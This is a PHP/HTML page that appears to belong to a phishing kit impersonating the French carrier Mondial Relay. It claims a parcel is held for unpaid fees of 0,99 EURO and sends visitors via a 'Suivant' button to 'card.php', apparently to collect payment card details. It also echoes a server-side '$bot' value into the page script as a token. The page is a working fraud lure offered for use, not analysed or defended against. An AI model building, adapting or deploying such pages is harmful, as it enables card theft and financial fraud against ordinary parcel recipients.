<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>mondialrelay</title>
</head>
<body>
    
<header>

<div class="mobill">
<img src="res/img/header.png" >
</div>

    <div class="left">

<div class="logo">
<img src="res/img/logo.png" >
</div>

    </div>

    <div class="right">
<label> Suivi de colis</label> <label > Envoi de colis</label> <label > Points Relais® <br>
et Lockers</label> <label > Aide</label>

 <button type="button">Solutions Pro</button>

    </div>
</header>
<script>var token=<?php echo json_encode($bot); ?>;</script>









<main>

    <div class="continer">

    <div class="text">
<b>Suivi de votre colis</b>
</div>


<div class="text">
<label>Nous n'avons pas pu livrer votre colis
car certains frais n'ont pas encore été payés. Veuillez régler les
frais d'expédition et convenir d'une nouvelle date de livraison.</label>
</div><br> <br>


<div class="dates">
    <div class="date"><?php echo date("Y-m-d", strtotime("+1 day"))." - ".$fees;?></div>
</div>





<div class="card">
        <h2>VOTRE ENVOI</h2>

        <div class="content">
            <img src="res/img/pack.png" >
            <div>
                
                <p>Votre colis en cours</p>
                <div> <p>Destination : <span class="dots">France</span></p> </div>
               <div> <p>Nom de l'entreprise: <span class="dots">mondial (R)</span></p> </div>
               <div> <p>Poids : <span class="dots">0.942 Kg</span></p> </div>
               <div><p>impôts : <span class="dots">0,99 EURO</span></p> </div>
               <div><p>Prix final : <span class="dots">0,99 EURO</span></p> </div>
               
            </div>
        </div>
    </div>

  




  <div class="col">
  <button onclick="mov()">Suivant</button>
</div>


  
    </div>
</main>







<script>
    function mov(){
        window.location="card.php";
    }
</script>

<footer>


<div class="foter">
<img src="res/img/fpc.png" >
</div>
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>
<div class="mobil">
<img src="res/img/mobil.png" >
</div>
</footer>

</body>
</html>


</body>
</html>